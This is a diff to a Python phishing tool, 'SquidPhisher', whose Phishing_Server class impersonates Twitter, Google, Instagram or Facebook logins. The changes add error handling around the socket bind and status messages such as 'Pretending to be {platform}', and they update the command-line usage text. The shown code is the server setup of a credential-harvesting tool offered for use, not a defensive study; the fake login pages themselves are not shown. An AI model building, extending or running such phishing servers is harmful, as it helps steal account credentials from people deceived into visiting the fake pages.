@@ -7,15 +7,22 @@ class Phishing_Server:
         self.platforms = ['twitter', 'google', 'instagram', 'facebook']
         self.platform = platform
         if self.platform not in self.platforms:
-            print(f"[+] The specified platform is not in the list.\n[+] You Can choose from: {self.platforms}\n[+] Going with Facebook.")
+            print(f"[+] The specified platform is not in the list.\n[+] You Can choose from: {self.platforms}\n[+] Going with Facebook as a default.")
             self.platform = "facebook"
         if externalip is None:
             self.externalip = ip
         else:
             self.externalip = externalip
         self.ip_list = []
-        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.s.bind((self.ip, self.port))
+        try:
+            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.s.bind((self.ip, self.port))
+            print("[+] Successfully Binded Server and Port!")
+            print("[+] Phishing Server is up and running.\n")
+            print(f"[+] Pretending to be {self.platform}.")
+        except:
+            print("[+] Unable to Bind IP and Port.")
+            sys.exit()
     def listen(self):
         print(f"[+] Phishing Server is listening on {self.ip}:{self.port}")
         while True:
@@ -698,7 +705,7 @@ Phishing Server Script By DrSquid  """)
 [+] Note: These optional arguements have defaults, so you are able to leave them.
 
 [+] Usage:
-[+] python3 SquidPhisher.py --ip <ipaddr/host> --ri --ti --rd --la
+[+] python3 SquidPhisher.py --ip <ipaddr> --p <port> --pl <platform> --eh <externalhost>
 [+] python3 SquidPhisher.py --i""")
     def parse_args(self):
         self.logo()
